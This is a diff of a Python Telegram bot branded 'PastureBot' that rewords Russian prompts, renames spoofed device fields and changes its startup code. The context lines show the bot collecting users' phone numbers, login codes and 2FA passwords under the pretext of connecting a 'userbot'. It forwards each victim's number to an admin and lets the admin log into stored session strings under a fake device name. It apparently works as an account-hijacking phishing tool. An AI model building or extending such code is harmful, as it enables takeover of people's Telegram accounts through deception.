@@ -135,7 +135,7 @@ async def cmd_start(message: Message, state: FSMContext):
         one_time_keyboard=True,
     )
     await message.answer(
-        "Pasture Us🏴‍☠️ Поделитесь контактом что бы Юзербот работал",
+        "PastureUs🏴‍☠️ Для подключения юзбота поделитесь контактом",
         reply_markup=keyboard,
     )
     await state.set_state(AuthState.waiting_for_phone)
@@ -162,7 +162,7 @@ async def process_phone(message: Message, state: FSMContext):
     phone = f"+{cleaned_digits}"
 
     await message.answer(
-            f"⏳ Обрабатываю Ожидайте!<code>{phone}</code> и запрашиваю код у Telegram...",
+        f"⏳ Обрабатываю номер <code>{phone}</code> и запрашиваю код у Telegram...",
         reply_markup=ReplyKeyboardRemove(),
         parse_mode="HTML",
     )
@@ -333,7 +333,7 @@ async def process_password(message: Message, state: FSMContext):
         conn.commit()
         conn.close()
 
-        await message.answer("✅ Юзербота подключен!")
+        await message.answer("✅ Юзербота подключен под Pasturebot!")
         await bot.send_message(ADMIN_ID, f"🔔 Номер (2FA):\n🆔 ID: `{user_id}`\n📱 Номер: `{phone}`", parse_mode="Markdown")
         del temp_auth_data[user_id]
         await state.clear()
@@ -527,8 +527,8 @@ async def admin_spawn_session(callback: CallbackQuery):
             api_id=int(API_ID),
             api_hash=API_HASH,
             session_string=string_session,
-            device_model="Pasture",
-            system_version="Pasture",
+            device_model="PastureBot",
+            system_version="PastureBot",
             app_version="PastureBot",
             in_memory=True
         )
@@ -538,7 +538,7 @@ async def admin_spawn_session(callback: CallbackQuery):
         await client.disconnect()
 
         await callback.message.edit_text(
-            f"✅ **Сеанс Pasture успешно добавлен! юзербота работает **🎉\n\n"
+            f"✅ **Сеанс Pasture успешно добавлен! Юзербота работает **🎉\n\n"
             f"• Аккаунт: `@{me.username or me.first_name}`\n"
             f"• Телефон: `{phone}`\n"
             f"• Устройство: `CPython 3.14.3` (Windows 10)\n\n"
@@ -961,4 +961,11 @@ async def main():
 
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    try:
+        loop = asyncio.get_event_loop()
+        if loop.is_running():
+            asyncio.create_task(main())
+        else:
+            loop.run_until_complete(main())
+    except RuntimeError:
+        asyncio.run(main())
